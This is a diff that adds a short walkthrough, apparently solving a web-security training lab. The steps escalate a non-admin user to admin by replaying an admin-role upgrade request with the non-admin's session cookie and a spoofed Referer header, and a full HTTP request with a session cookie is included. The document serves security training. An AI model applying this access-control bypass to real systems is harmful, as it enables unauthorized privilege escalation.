@@ -1,0 +1,24 @@
+Log in using the admin credentials.
+Browse to the admin panel, promote carlos, and send the HTTP request to Burp Repeater.
+Open a private/incognito browser window, and log in with the non-admin credentials.
+Browse to /admin-roles?username=carlos&action=upgrade and observe that the request is treated as unauthorized due to the absent Referer header.
+Copy the non-admin user's session cookie into the existing Burp Repeater request, change the username to yours, and replay it.
+
+GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+Host: acf11f981fdbe48dc0e245a100e100a2.web-security-academy.net
+Cookie: session=nZ3mVzHiRhfTAzvaPzIx9in9vuhkYOni
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://acf11f981fdbe48dc0e245a100e100a2.web-security-academy.net/admin
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
